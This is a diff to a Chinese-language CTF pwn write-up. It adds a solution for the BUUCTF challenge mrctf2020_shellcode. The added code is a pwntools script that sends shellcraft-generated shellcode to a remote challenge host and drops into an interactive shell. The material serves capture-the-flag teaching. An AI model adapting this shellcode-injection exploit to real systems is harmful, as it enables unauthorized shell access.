@@ -769,7 +769,7 @@ if __name__ == "__main__":
     main()
 ```
 
-#### 例题 2：ciscn_2019_n_5
+##### 例题 2：ciscn_2019_n_5
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_n_5)
 
@@ -828,3 +828,39 @@ if __name__ == "__main__":
 
 不过大概可以在本地关掉 ASLR 实验一下。
 
+##### 例题 3：mrctf2020_shellcode
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode)
+
+安全检查：
+
+<img width="392" height="148" alt="52532d2aafc7eb5c50944082a73d0c53" src="https://github.com/user-attachments/assets/dc3413b1-7347-4182-926b-93ddd25f2352" />
+
+<img width="691" height="455" alt="8fd3760501dba3550fb0e8e646f9a1b9" src="https://github.com/user-attachments/assets/cf9e0d1e-9b9f-48c2-b4ef-897c549441a8" />
+
+这道题反编译看不了伪代码，看汇编吧。
+
+<img width="928" height="490" alt="image" src="https://github.com/user-attachments/assets/223f67f9-7ee2-41d5-8d1d-5321a75de850" />
+
+发现这道题直接 jump 到输入的地址上，所以根本不用算溢出（其实也溢出不能，因为 read 规定的读入量爆不了栈），直接把 shellcode 发过去就行。
+
+```
+# Written by Sonnety
+from pwn import *
+
+context.arch = "amd64"
+host = "node5.buuoj.cn"
+port = 25867
+shellcode = asm(shellcraft.sh())
+
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Show me your magic!\n")
+    io.sendline(shellcode)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+```
